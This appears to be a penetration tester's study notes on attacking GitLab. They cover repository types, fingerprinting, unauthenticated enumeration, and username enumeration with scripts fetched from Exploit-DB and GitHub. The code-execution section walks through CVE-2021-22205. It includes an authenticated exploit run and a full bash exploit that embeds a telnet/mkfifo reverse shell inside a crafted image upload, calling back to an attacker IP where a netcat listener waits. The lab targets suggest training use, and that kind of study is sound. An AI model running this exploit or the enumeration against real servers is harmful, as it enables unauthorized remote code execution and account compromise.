---
Primary_category: "[[WEB TECHNOLOGIES]]"
title: "GITLAB"
draft: false
banner: "https://images.unsplash.com/photo-1589763472885-46dd5b282f52?q=80&w=1748&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D"
banner_y: 0.88286
tags:
cssclasses:
---

###### PRIMARY CATEGORY → [[WEB TECHNOLOGIES]]

#### *Theory*

##### *Repository Types*

- ***Public Repositories***

Anyone can access to them as they do not require any authentication

- ***Internal Repositories***

All authenticated users can access to them

- ***Private Repositories***

Access to them is limited to specific authenticated users

That said, a *GITLAB*  instance can be configured to allow anyone to register and then login without any validation, so an operator could access any public repositories of the given company

![[GITLAB-20260330193254695.webp|350]]

> ***Zoom in***

---

#### *Discovery | Footprinting*

##### *Detecting a Gitlab Instance*

###### *Login Page*

We can quickly identify that a web application is a *GITLAB* instance as we will be redirected to its login page once we access the given *URL*

![[GITLAB-20260330193644501.webp|350]]

> ***Zoom in***

##### *Gitlab Version*

###### *Help Page*

The only way we have to list the version of the *GITLAB* instance we are dealing with is by browsing the */help* page when logged in

---

#### *Enumeration*

##### *Public Projects/Repositories*

> ***No authentication required***

There is no much we can do against *GITLAB* without knowing the version number *( Public Exploits )* or being logged in

We can visit the */browse* page to see if there is any existing public project that may contain something interesting such as credentials, *SSH/API* keys or any other type of sensitive information

![[GITLAB-20260330195235794.webp|350]]

> ***Zoom in***

Moreover, we should also check other sections such as *groups*, *snippets* or *help* and the *search* functionality that it has

![[GITLAB-20260330205223256.webp|350]]

> ***Zoom in***

##### *Internal Repositories*

Once we are done with the unauthenticated enumeration, we should try to register a new user account in the *GITLAB* instance, as it might not be configured to →

- ***Only allow company emails to be registered***
- ***Require an admin to approve a new account***

If not, just proceed with the account creation and log in to look for available internal repositories

---

#### *User Enumeration*

By default, *GITLAB* allows 10 failed login attempts before locking out the account for a certain period of time

The latter corresponds to 10 minutes

This behaviour can be modified by setting a different value to the following directives

```bash
config.maximum_attempts = 10
config.unlock_in = 10.minutes
```

In order to carry out a proper user enumeration of the *GITLAB* instance, we can leverage one of the following tools

##### *Wordlists*

> ***[Ref. I](https://github.com/danielmiessler/SecLists/blob/master/Usernames/cirt-default-usernames.txt)***

##### *Bash*

> ***[Exploit-DB](https://www.exploit-db.com/raw/49821)***

###### *Setup*

```bash
curl --silent --location --request GET 'https://www.exploit-db.com/raw/49821' --output - | sed 's@\r@@g' > gitlab_userenum.bash
```

###### *Usage*

```bash
bash !$ --url '<TARGET>' --userlist '<USER_LIST>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> bash gitlab_user_enum.bash --url 'http://gitlab.inlanefreight.local:8081/' --userlist ./user.list
> ```
>

##### *Python3*

> ***[GitLabUserEnum](https://github.com/dpgg101/GitLabUserEnum)***

###### *Setup*

```bash
curl --silent --location --request GET 'https://github.com/dpgg101/GitLabUserEnum/raw/refs/heads/main/gitlab_userenum.py' --remote-name
```

###### *Usage*

```bash
python3 gitlab_userenum.py --url '<TARGET>' --wordlist '<USER_LIST>'
```

> [!DANGER]- *e.g.*
>
> ```bash
> python3 gitlab_userenum.py --url 'http://gitlab.inlanefreight.local:8081/' --wordlist ./user.list
> ```
>

---

#### *Code Execution*

##### *CVE-2021-22205*

> ***[CVE-2021-22205](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2021-22205)***

> ***[HackerOne](https://hackerone.com/reports/1154542)***

> ***Affected Versions → GITLAB CE 13.10.2 and lower***

In this case the vulnerability lies on *GITLAB* not properly validating image files that were passed to a file parser *( exiftool )* which resulted in an *RCE*

###### *Authenticated*

> ***[Reference](https://www.exploit-db.com/raw/49951)***

In order to exploit this security flaw, we can use the following ***[exploit](https://www.exploit-db.com/exploits/49951)*** from *ExploitDB*

- ***Setup***

```bash
curl --silent --location --request GET 'https://www.exploit-db.com/raw/49951' --output CVE-2021-22205.py
```

```bash
python3 -m venv .venv
. !$/bin/activate && pip3 install bs4 requests
```

- ***Usage***

```bash
python3 !$ -u '<USER>' -p '<PASSWD>' -t '<TARGET_URL>' -c '<COMMAND>'
```

> [!DANGER]- *e.g.*
>
> We listen for incoming *ICMP* packets →
>
> ```bash
> tcpdump --interface <INTERFACE> -v -n icmp
> ```
>
> Then, we run the exploit as follows →
>
> ```bash
> python3 CVE-2021-22205.py -u 'john.doe' -p 'password1234$!' -t 'http://gitlab.inlanefreight.local:8081' -c 'ping -c 4 10.10.10.15'
> ```
>

###### *Unauthenticated*

> ***[Reference](https://www.exploit-db.com/exploits/50532)***

The same security flaw can be exploited from an unauthenticated perspective if we are not able to sign up in the *GITLAB* instance due to some limitations or security measures

In this case, we can proceed as follows

- ***Setting up a TCP listener***

```bash
nc -nlvp 443
```

- ***Running the following Bash script***

> [!BUG]- *Exploit.bash*
>
> ```bash
> #!/usr/bin/env bash
> 
> _STRING1="QVQmVEZPUk0AAAOvREpWTURJUk0AAAAugQACAAAARgAAAKz//96/mSAhyJFO6wwHH9LaiOhr5kQPLHEC7knTbpW9osMiP0ZPUk0AAABeREpWVUlORk8AAAAKAAgACBgAZAAWAElOQ0wAAAAPc2hhcmVkX2Fubm8uaWZmAEJHNDQAAAARAEoBAgAIAAiK5uGxN9l/KokAQkc0NAAAAAQBD/mfQkc0NAAAAAICCkZPUk0AAAMHREpWSUFOVGEAAAFQKG1ldGFkYXRhCgkoQ29weXJpZ2h0ICJcCiIgLiBxeHs="
> _STRING2="fSAuIFwKIiBiICIpICkgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCg=="
> 
> main ()
> {
>     local -- _URL=$1 _IP=$2 _PORT=$3 _FILE=$4
> 
>     echo -e "$5" | base64 -d > "$_FILE"
>     echo -n "TF=\$(mktemp -u);mkfifo \$TF && telnet $_IP $_PORT 0<\$TF | sh 1>\$TF" >> "$_FILE"
>     echo -n "$6" | base64 -d >> "$_FILE"
> 
>     curl \
>         --silent \
>         --location \
>         --form "file=@$_FILE" \
>         "$_URL/asdf"
> }
> 
> main "$@" "test.jpg" "$_STRING1" "$_STRING2"
> ```
>

```bash
bash exploit.bash 'http://gitlab.inlanefreight.local:8081' '10.10.15.63' 1234
```